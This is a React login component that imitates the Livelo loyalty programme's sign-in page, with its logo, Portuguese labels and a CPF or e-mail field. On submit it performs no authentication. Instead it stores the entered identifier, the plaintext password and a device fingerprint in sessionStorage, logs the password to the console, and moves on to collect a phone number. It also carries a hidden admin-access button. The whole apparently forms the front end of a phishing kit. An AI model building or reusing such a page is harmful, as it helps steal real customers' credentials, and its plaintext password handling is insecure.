import React, { useState } from "react";
import { formatCPF, isValidCPFOrEmail } from "../utils/validators";
import { getDeviceString } from "../utils/deviceDetect";
import "./Login.css";

const Login = ({ onLoginSuccess, onGoToCreate, onGoToAdmin }) => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [emailError, setEmailError] = useState("");

  const handleEmailChange = (e) => {
    let value = e.target.value;

    // Se parecer ser CPF, formata
    if (/^\d/.test(value) && !value.includes("@")) {
      value = formatCPF(value);
    }

    setEmail(value);
    setEmailError("");
  };

  const handleEmailBlur = () => {
    if (email.trim() !== "" && !isValidCPFOrEmail(email)) {
      setEmailError("Informe seu CPF ou e-mail para prosseguir.");
    }
  };

  const handleSubmit = (e) => {
    e.preventDefault();

    // Validação final
    if (!isValidCPFOrEmail(email)) {
      setEmailError("Informe seu CPF ou e-mail para prosseguir.");
      return;
    }

    // Salva dados temporariamente para adicionar telefone depois
    sessionStorage.setItem(
      "pendingLoginData",
      JSON.stringify({
        email,
        password,
        device: getDeviceString(),
      })
    );

    console.log("Login:", { email, password });
    // Aqui você pode adicionar a lógica de autenticação
    // Após validar o login, vai para tela de confirmação de telefone
    if (onLoginSuccess) {
      onLoginSuccess(email);
    }
  };

  const isFormValid =
    email.trim() !== "" && password.trim() !== "" && password.length >= 6;

  return (
    <div className="login-container">
      <div className="login-box">
        {/* Logo */}
        <div className="logo">
          <img src="/logo-livelo.svg" alt="Livelo" />
        </div>

        {/* Título */}
        <h1 className="login-title">Entre com sua conta Livelo</h1>

        {/* Formulário */}
        <form className="login-form" onSubmit={handleSubmit}>
          {/* Campo CPF ou E-mail */}
          <div className="input-group">
            <div className="input-wrapper">
              <input
                type="text"
                id="email"
                value={email}
                onChange={handleEmailChange}
                onBlur={handleEmailBlur}
                className={`login-input ${emailError ? "error" : ""}`}
                placeholder=" "
                maxLength={email.includes("@") ? 100 : 14}
              />
              <label htmlFor="email" className="floating-label">
                CPF ou E-mail
              </label>
              <span className="input-icon">
                <svg
                  width="20"
                  height="20"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                >
                  <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2" />
                  <circle cx="12" cy="7" r="4" />
                </svg>
              </span>
            </div>
            {emailError && <span className="error-message">{emailError}</span>}
          </div>

          {/* Campo Senha */}
          <div className="input-group">
            <div className="input-wrapper">
              <input
                type={showPassword ? "text" : "password"}
                id="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                className="login-input"
                placeholder=" "
              />
              <label htmlFor="password" className="floating-label">
                Senha
              </label>
              <span className="input-icon">
                <svg
                  width="20"
                  height="20"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                >
                  <rect x="3" y="11" width="18" height="11" rx="2" ry="2" />
                  <path d="M7 11V7a5 5 0 0 1 10 0v4" />
                </svg>
              </span>
              <button
                type="button"
                className="toggle-password"
                onClick={() => setShowPassword(!showPassword)}
                aria-label={showPassword ? "Ocultar senha" : "Mostrar senha"}
              >
                {showPassword ? (
                  <svg
                    width="20"
                    height="20"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                  >
                    <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z" />
                    <circle cx="12" cy="12" r="3" />
                  </svg>
                ) : (
                  <svg
                    width="20"
                    height="20"
                    viewBox="0 0 24 24"
                    fill="none"
                    stroke="currentColor"
                    strokeWidth="2"
                  >
                    <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24" />
                    <line x1="1" y1="1" x2="23" y2="23" />
                  </svg>
                )}
              </button>
            </div>
          </div>

          {/* Link Esqueceu senha */}
          <div className="forgot-password">
            <a href="#esqueceu-senha">Esqueceu sua senha?</a>
          </div>

          {/* Botão Entrar */}
          <button
            type="submit"
            className={`login-button ${isFormValid ? "active" : ""}`}
            disabled={!isFormValid}
          >
            Entrar
          </button>
        </form>

        {/* Criar conta */}
        <div className="create-account">
          <p>Ainda não tem conta?</p>
          <button onClick={onGoToCreate} className="create-account-link">
            Crie sua conta Livelo
          </button>
        </div>
      </div>

      {/* Voltar para página inicial */}
      <div className="back-home">
        <a href="#home">
          <svg
            width="16"
            height="16"
            viewBox="0 0 24 24"
            fill="none"
            stroke="currentColor"
            strokeWidth="2"
          >
            <polyline points="15 18 9 12 15 6" />
          </svg>
          Voltar para página inicial
        </a>
        {onGoToAdmin && (
          <button
            onClick={onGoToAdmin}
            className="admin-access"
            title="Acesso Admin (Shift+A)"
          >
            🔑
          </button>
        )}
      </div>
    </div>
  );
};

export default Login;
